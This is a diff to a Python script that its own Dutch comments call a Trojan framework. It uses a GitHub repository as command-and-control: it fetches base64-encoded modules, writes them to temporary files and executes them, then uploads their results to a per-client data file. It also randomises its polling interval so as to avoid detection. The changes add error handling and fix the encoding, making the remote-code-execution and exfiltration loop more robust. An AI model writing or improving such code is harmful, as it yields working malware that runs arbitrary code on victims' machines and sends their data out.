@@ -12,7 +12,7 @@ hostname = socket.gethostname()
 
 # Haal accestoken op
 with open("accesToken.secret", 'r') as file:
-    token = file.read()
+    token = file.read().strip()
     
 
 # Configuratie van de GitHub-repository
@@ -28,9 +28,10 @@ HEADERS = {
 
 def fetch_config():
     # Download configuratiebestand van de GitHub-repo
-    url = f"{GITHUB_REPO}/contents/config/config.json"
-    response = requests.get(url, headers=HEADERS)
     try:
+        url = f"{GITHUB_REPO}/contents/config/config.json"
+        response = requests.get(url, headers=HEADERS)
+        
         if response.status_code == 200:
             # Haal Base64-gecodeerde inhoud op en decodeer het
             content = response.json()["content"]
@@ -45,54 +46,71 @@ def fetch_config():
         return {}
 
 def fetch_module(module_name):
-    # Download modulebestand van de GitHub-repo
-    url = f"{GITHUB_REPO}/contents/modules/{module_name}.py"
-    response = requests.get(url, headers=HEADERS)
-    if response.status_code == 200:
-        module_code = response.json()["content"]
-        with open(f"temp_{module_name}.py", "w") as module_file:
-            module_file.write(module_code)
-        return f"temp_{module_name}.py"
-    else:
-        print(f"Fout bij ophalen van module {module_name}: {response.status_code}")
+    try:
+        url = f"{GITHUB_REPO}/contents/modules/{module_name}.py"
+        response = requests.get(url, headers=HEADERS)
+
+        if response.status_code == 200:
+            # Decodeer Base64-gecodeerde inhoud
+            encoded_content = response.json()["content"]
+            decoded_content = base64.b64decode(encoded_content).decode("utf-8")
+
+            # Schrijf de inhoud naar een tijdelijk bestand
+            temp_path = f"temp_{module_name}.py"
+            with open(temp_path, "w") as module_file:
+                module_file.write(decoded_content)
+
+            return temp_path
+        else:
+            print(f"Fout bij ophalen van module {module_name}: {response.status_code}")
+            return None
+    except Exception as e:
+        print(f"Fout bij ophalen van module {module_name}: {e}")
         return None
 
 def execute_module(module_path):
     # Voer module uit
-    spec = importlib.util.spec_from_file_location("module", module_path)
-    module = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(module)
-    result = module.run()  # Veronderstelt dat elke module een `run()`-functie heeft
-    os.remove(module_path)  # Verwijder de temp module na uitvoering
-    return result
+    try:
+        spec = importlib.util.spec_from_file_location("module", module_path)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        result = module.run()  # Veronderstelt dat elke module een `run()`-functie heeft
+        os.remove(module_path)  # Verwijder de tijdelijke module na uitvoering
+        return result
+    except Exception as e:
+        print(f"Fout bij uitvoeren van module {module_path}: {e}")
+        return {"status": "error", "error_message": str(e)}
 
 def send_results(data):
     # Upload de resultaten van een module naar de data-map in de GitHub-repo
-    file_path = f"data/{CLIENT_ID}.json"
-    url = f"{GITHUB_REPO}/contents/{file_path}"
-    
-    # Huidige inhoud ophalen
-    response = requests.get(url, headers=HEADERS)
-    if response.status_code == 200:
-        sha = response.json()["sha"]
-    else:
-        sha = None  # Nieuw bestand
-    
-    # Data voorbereiden
-    content = json.dumps(data)
-    encoded_content = content.encode("utf-8").decode("latin1")
-    payload = {
-        "message": "Update module results",
-        "content": encoded_content,
-        "sha": sha
-    }
-    
-    # Uploaden
-    response = requests.put(url, headers=HEADERS, json=payload)
-    if response.status_code == 201 or response.status_code == 200:
-        print("Resultaten succesvol geüpload.")
-    else:
-        print(f"Fout bij uploaden: {response.status_code}")
+    try:
+        file_path = f"data/{CLIENT_ID}.json"
+        url = f"{GITHUB_REPO}/contents/{file_path}"
+
+        # Huidige inhoud ophalen
+        response = requests.get(url, headers=HEADERS)
+        if response.status_code == 200:
+            sha = response.json()["sha"]
+        else:
+            sha = None  # Nieuw bestand
+
+        # Data voorbereiden
+        content = json.dumps(data)
+        encoded_content = base64.b64encode(content.encode("utf-8")).decode("utf-8")
+        payload = {
+            "message": "Update module results",
+            "content": encoded_content,
+            "sha": sha
+        }
+
+        # Uploaden
+        response = requests.put(url, headers=HEADERS, json=payload)
+        if response.status_code in [200, 201]:
+            print("Resultaten succesvol geüpload.")
+        else:
+            print(f"Fout bij uploaden: {response.status_code}")
+    except Exception as e:
+        print(f"Fout bij uploaden van resultaten: {e}")
 
 def main():
     # Hoofdfunctie van het Trojan-framework
@@ -109,7 +127,8 @@ def main():
                     send_results({module_name: results})
         
         # Wacht een willekeurige tijd om detectie te voorkomen
-        sleep_time = random.randint(30, 120)  # 30 tot 120 seconden
+        # sleep_time = random.randint(30, 120)  # 30 tot 120 seconden
+        sleep_time= 10
         time.sleep(sleep_time)
 
 if __name__ == "__main__":
